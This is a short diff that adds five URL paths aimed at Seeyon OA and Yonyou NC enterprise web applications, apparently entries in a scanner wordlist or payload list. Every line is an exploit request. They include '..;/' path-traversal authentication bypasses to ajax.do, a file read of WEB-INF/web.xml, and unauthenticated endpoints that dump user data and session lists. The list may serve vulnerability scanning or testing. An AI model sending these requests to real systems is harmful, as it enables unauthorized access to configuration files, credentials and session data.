@@ -1,0 +1,5 @@
+/seeyon/thirdpartyController.do.css/..;/ajax.do
+/NCFindWeb?service=IPreAlertConfigService&filename=WEB-INF/web.xml
+/yyoa/DownExcelBeanServlet?contenttype=username&contentvalue=&state=1&per_id=0
+/seeyon/personalBind.do.jpg/..;/ajax.do?method=ajaxAction&managerName=mMOneProfileManager&managerMethod=getOAProfile
+/yyoa/ext/https/getSessionList.jsp?cmd=getAll
